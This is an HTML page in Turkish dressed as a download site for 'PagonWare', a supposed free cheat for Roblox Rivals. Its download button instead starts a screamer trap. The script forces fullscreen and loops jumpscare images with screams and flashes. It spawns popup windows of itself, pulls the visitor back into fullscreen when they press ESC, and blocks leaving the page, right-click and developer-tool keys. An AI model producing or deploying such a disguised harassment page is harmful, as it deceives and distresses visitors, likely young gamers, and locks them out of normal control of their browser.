<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PagonWare | En İyi Deneyim</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* --- ORTAK VE MODERN STİLLER --- */
        :root {
            --primary-bg: #191919;
            --accent-color: #269cc8;
            --text-primary: #ffffff;
            --horror-red: #ff0000;
        }

        body, html {
            margin: 0; padding: 0;
            background-color: var(--primary-bg);
            color: var(--text-primary);
            font-family: 'Segoe UI', sans-serif;
            overflow-x: hidden;
            transition: background 0.5s;
        }

        /* --- PRELOADER --- */
        .preloader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; display: flex; justify-content: center; align-items: center;
            z-index: 9999;
        }

        /* --- ANA SAYFA DÜZENİ --- */
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid #333; }
        .logo { font-size: 28px; font-weight: bold; }
        .logo span { color: var(--accent-color); }
        .hero { padding: 100px 0; text-align: center; }
        .btn-main { 
            background: var(--accent-color); color: white; padding: 15px 40px; 
            border: none; border-radius: 5px; cursor: pointer; font-size: 18px; 
            transition: 0.3s; text-decoration: none; display: inline-block;
        }

        /* --- KORKU EKRANI (GİZLİ) --- */
        #horror-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: black; z-index: 10000; display: none;
            justify-content: center; align-items: center; cursor: none;
        }

        #jumpscare-img {
            width: 100%; height: 100%; object-fit: cover;
            display: none; position: absolute;
        }

        .glitch-text {
            font-family: 'Creepster', cursive;
            font-size: 5rem; color: var(--horror-red);
            text-shadow: 2px 2px 10px #000;
            animation: shake 0.1s infinite;
            display: none;
        }

        /* --- ANİMASYONLAR --- */
        @keyframes shake {
            0% { transform: translate(2px, 2px); filter: invert(0); }
            50% { transform: translate(-2px, -2px); filter: invert(1); }
            100% { transform: translate(2px, 2px); }
        }

        .flash {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; opacity: 0; pointer-events: none; z-index: 10001;
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="preloader" id="preloader">
        <h2 style="color: white; letter-spacing: 5px;">YÜKLENİYOR...</h2>
    </div>

    <div id="main-site">
        <header class="container">
            <div class="logo">Pagon<span>Ware</span></div>
            <nav>
                <button class="btn-main" onclick="initChaos()">Ücretsiz Sürümü İndir</button>
            </nav>
        </header>

        <section class="container hero">
            <h1>Roblox Rivals İçin En İyi Yazılım</h1>
            <p style="color: #888; margin-bottom: 30px;">Hızlı, Güvenli ve Tamamen Ücretsiz.</p>
            <img src="https://i.hizliresim.com/n2o0qor.png" style="width: 100%; max-width: 600px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5);">
        </section>
    </div>

    <div id="horror-overlay">
        <div class="glitch-text" id="horror-msg">KAÇIŞ YOK</div>
        <img src="https://i.ibb.co/L6vV5vK/scary.jpg" id="jumpscare-img">
    </div>

    <div class="flash" id="flash-effect"></div>

    <audio id="scream" src="https://www.soundjay.com/human/sounds/shout-01.mp3"></audio>
    <audio id="whisper" src="https://www.soundjay.com/mechanical/sounds/drone-01.mp3" loop></audio>

    <script>
        // Preloader Kaldır
        window.onload = () => {
            setTimeout(() => {
                document.getElementById('preloader').style.display = 'none';
            }, 1000);
        };

        // --- KAOS BAŞLATMA FONKSİYONU ---
        function initChaos() {
            const horrorOverlay = document.getElementById('horror-overlay');
            const mainSite = document.getElementById('main-site');
            const scream = document.getElementById('scream');
            const whisper = document.getElementById('whisper');
            const horrorMsg = document.getElementById('horror-msg');

            // 1. Tam Ekran Zorla
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }

            // 2. Arayüzü Değiştir
            mainSite.style.display = 'none';
            horrorOverlay.style.display = 'flex';
            horrorMsg.style.display = 'block';
            whisper.play();

            // 3. Çıkışı Engelle (Uyarı Mesajı)
            window.onbeforeunload = function() {
                return "RUHUNU BURADA BIRAKTIN...";
            };

            // 4. Sonsuz Jumpscare Döngüsü
            setInterval(() => {
                triggerJumpscare();
            }, 4000); // Her 4 saniyede bir dene
        }

        function triggerJumpscare() {
            const jsImg = document.getElementById('jumpscare-img');
            const scream = document.getElementById('scream');
            const flash = document.getElementById('flash-effect');

            // Rastgele tetikleme (Heyecan için %50 şans)
            if(Math.random() > 0.5) {
                jsImg.style.display = 'block';
                scream.currentTime = 0;
                scream.volume = 1.0;
                scream.play();

                // Beyaz Flaş
                flash.style.opacity = '1';
                setTimeout(() => { flash.style.opacity = '0'; }, 150);

                // Ekstra Pencere Bombası
                try {
                    window.open(window.location.href, '_blank', `width=100,height=100,left=${Math.random()*1000}`);
                } catch(e) {}

                // 1 saniye sonra görseli gizle
                setTimeout(() => {
                    jsImg.style.display = 'none';
                }, 1200);
            }
        }

        // --- GÜVENLİK VE KİLİT SİSTEMLERİ ---
        
        // ESC ile tam ekrandan çıkarsa geri sok
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement && document.getElementById('main-site').style.display === 'none') {
                alert("NEREYE GİDİYORSUN?");
                document.documentElement.requestFullscreen();
            }
        });

        // Tuş Engelleme (F12, CTRL+U vb.)
        document.onkeydown = function(e) {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
                return false;
            }
        };
    </script>
</body>
</html>
